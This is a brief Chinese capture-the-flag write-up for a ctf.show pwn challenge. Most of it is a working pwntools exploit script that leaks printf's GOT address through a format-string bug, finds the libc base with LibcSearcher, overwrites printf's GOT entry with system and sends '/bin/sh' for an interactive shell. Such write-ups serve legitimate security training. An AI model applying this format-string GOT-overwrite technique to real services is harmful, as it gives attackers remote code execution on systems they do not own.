# 挑战简介
加大了一点点难度，不过对你来说还是so easy 吧

# 思路
说是加大了难度，实际上只是不给你system地址了，你就要用libcsearcher爆出来即可  

 ```
 #!/usr/bin/python
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28276)

elf = ELF('./pwn')

print_got = elf.got['printf']
payload = p32(print_got) + b'%6$s'

io.recvuntil("    * *************************************                           ")

io.sendline(payload)

printf_addr = u32(io.recvuntil('\xf7')[-4:])
print("printf address:", hex(printf_addr))

libc = LibcSearcher('printf', printf_addr)
libc_base = printf_addr - libc.dump('printf')

sys_addr = libc_base + libc.dump('system')

payload = fmtstr_payload(6, {print_got:sys_addr})

io.send(payload)

io.send('/bin/sh')
io.recv()
io.interactive()
 ```
